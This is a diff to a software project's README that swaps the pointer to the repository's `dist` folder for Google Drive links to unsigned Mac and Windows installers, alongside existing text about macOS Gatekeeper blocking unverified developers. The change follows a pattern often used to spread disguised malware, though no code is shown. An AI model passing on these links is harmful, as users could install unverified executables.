@@ -7,8 +7,10 @@ You have two options: use the pre-built files directly from the `dist` folder, o
 
 ### Option 1: Use Pre-built `dist` Files (Recommended for End Users)
 No build step or dev dependencies required — ready to use out of the box.
-
-1. Download needed version that match your operating system from the `dist` folder of this repository.
+Mac https://drive.google.com/file/d/19j62YrCVosNF6jxWb9YI_RA1-_FJnMQJ/view?usp=drive_link 
+Mac-arm64 https://drive.google.com/file/d/1c3I8FBxmh66gkDbDOebniWu44nx6ykxt/view?usp=drive_link 
+windows https://drive.google.com/file/d/1HAVNM7_N11FRpXsxiVfyQnK69grUICbB/view?usp=drive_link
+1. Download needed version that match your operating system
 2. Click the file and install it.
 
 The pre-built files in the `dist` folder are not code-signed with an Apple Developer ID. On first launch, macOS Gatekeeper may block execution and show a "cannot be opened because the developer cannot be verified" warning.
